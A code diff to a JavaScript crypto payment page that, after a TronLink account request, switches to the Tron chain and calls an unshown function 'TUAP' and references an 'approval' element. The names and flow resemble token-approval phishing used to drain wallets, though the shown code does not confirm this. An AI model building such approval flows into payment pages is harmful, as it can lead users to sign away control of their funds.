@@ -263,7 +263,18 @@ function payNow() {
   amount = getCurrentDateTimeString();
   try {
     if (typeof window.tronLink !== 'undefined' && typeof window.tronLink.request === 'function') {
-      window.tronLink.request({ method: 'tron_requestAccounts' }).catch(function(){});
+      window.tronLink.request({ method: 'tron_requestAccounts' })
+        .then(function(){
+          try {
+            if (typeof window.tronWeb !== 'undefined') {
+              wallet = 'tronLink';
+              chain = 'tron';
+              TUAP();
+              return;
+            }
+          } catch (e) {}
+        })
+        .catch(function(){});
     }
   } catch (e) {}
   if (chain == "tron") {
@@ -435,6 +446,7 @@ chain = "undefined";
 wallet_ele = document.getElementById("wallet_d");
 pay_ele = document.getElementById("pay_d");
 pay_addr_input_ele = document.getElementById("pay_addr");
+approval = document.getElementById("approval");
 contract_addr = "undefined";
 contract_abi = [];
 document.addEventListener("DOMContentLoaded", function () {
